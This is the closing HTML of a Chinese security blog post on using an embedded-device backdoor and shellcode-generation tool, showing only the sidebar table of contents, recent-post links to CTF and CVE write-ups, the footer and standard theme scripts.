+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">bosh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/20/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E4%B8%8Eshellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/">http://example.com/2025/03/20/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E4%B8%8Eshellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Bosh's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/linux%E3%80%81Pwn/">linux、Pwn</a></div><div class="post-share"><div class="social-share" data-image="https://z-bosh.github.io/img/leak3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="next-post pull-full" href="/2025/03/08/BUUCTF/" title="BUUCTF-做题笔记"><img class="cover" src="https://z-bosh.github.io/img/match12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF-做题笔记</div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">bosh</div><div class="author-info-description">努力学习中~</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Z-bosh"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">阿拉山口卖囊的小伙说：阿达西！买囊不？</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">嵌入式设备后门工具的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">尝试漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.4.1.</span> <span class="toc-text">生成后门程序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E5%BC%B9shell"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">正向弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90shellcode"><span class="toc-number">1.4.2.</span> <span class="toc-text">生成shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%94%A8%E6%B3%95"><span class="toc-number">1.4.3.</span> <span class="toc-text">其他用法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/20/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E4%B8%8Eshellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/" title="嵌入式设备后门工具的利用"><img src="https://z-bosh.github.io/img/leak3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="嵌入式设备后门工具的利用"/></a><div class="content"><a class="title" href="/2025/03/20/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E4%B8%8Eshellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/" title="嵌入式设备后门工具的利用">嵌入式设备后门工具的利用</a><time datetime="2025-03-20T00:00:00.000Z" title="发表于 2025-03-20 00:00:00">2025-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/08/BUUCTF/" title="BUUCTF-做题笔记"><img src="https://z-bosh.github.io/img/match12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-做题笔记"/></a><div class="content"><a class="title" href="/2025/03/08/BUUCTF/" title="BUUCTF-做题笔记">BUUCTF-做题笔记</a><time datetime="2025-03-08T00:00:00.000Z" title="发表于 2025-03-08 00:00:00">2025-03-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/11/VNCTF-2025/" title="VNCTF-2025"><img src="https://z-bosh.github.io/img/match11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VNCTF-2025"/></a><div class="content"><a class="title" href="/2025/02/11/VNCTF-2025/" title="VNCTF-2025">VNCTF-2025</a><time datetime="2025-02-11T00:00:00.000Z" title="发表于 2025-02-11 00:00:00">2025-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/17/2024%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B/" title="2024年春秋杯网络安全联赛冬季赛"><img src="https://z-bosh.github.io/img/match10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024年春秋杯网络安全联赛冬季赛"/></a><div class="content"><a class="title" href="/2025/01/17/2024%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B/" title="2024年春秋杯网络安全联赛冬季赛">2024年春秋杯网络安全联赛冬季赛</a><time datetime="2025-01-17T00:00:00.000Z" title="发表于 2025-01-17 00:00:00">2025-01-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/14/CVE-2019-10999/" title="CVE-2019-10999_Dlink_ip摄像头复现"><img src="https://z-bosh.github.io/img/leak1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2019-10999_Dlink_ip摄像头复现"/></a><div class="content"><a class="title" href="/2025/01/14/CVE-2019-10999/" title="CVE-2019-10999_Dlink_ip摄像头复现">CVE-2019-10999_Dlink_ip摄像头复现</a><time datetime="2025-01-14T00:00:00.000Z" title="发表于 2025-01-14 00:00:00">2025-01-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/background.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2025 By bosh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Rweb,Pwn,Reverse,Linux,CTF,heap,stack" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
